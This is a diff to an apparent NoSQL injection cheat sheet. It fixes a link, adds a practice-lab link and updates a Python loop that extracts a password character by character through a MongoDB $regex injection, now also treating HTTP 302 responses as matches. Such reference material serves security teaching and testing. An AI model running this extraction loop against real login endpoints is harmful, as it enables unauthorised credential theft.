@@ -5,7 +5,7 @@
 ## Summary
 
 * [Tools](#tools)
-* [Exploit](exploits)
+* [Exploit](#exploits)
   * [Authentication Bypass](#authentication-bypass)
   * [Extract length information](#extract-length-information)
   * [Extract data information](#extract-data-information)
@@ -18,6 +18,7 @@
 ## Tools
 
 * [NoSQLmap - Automated NoSQL database enumeration and web application exploitation tool](https://github.com/codingo/NoSQLMap)
+* [nosqlilab - A lab for playing with NoSQL Injection](https://github.com/digininja/nosqlilab)
 
 ## Exploit
 
@@ -88,8 +89,8 @@ while True:
     for c in string.printable:
         if c not in ['*','+','.','?','|']:
             payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
-            r = requests.post(u, data = payload, headers = headers, verify = False)
-            if 'OK' in r.text:
+            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
+            if 'OK' in r.text or r.status_code == 302:
                 print("Found one more char : %s" % (password+c))
                 password += c
 ```
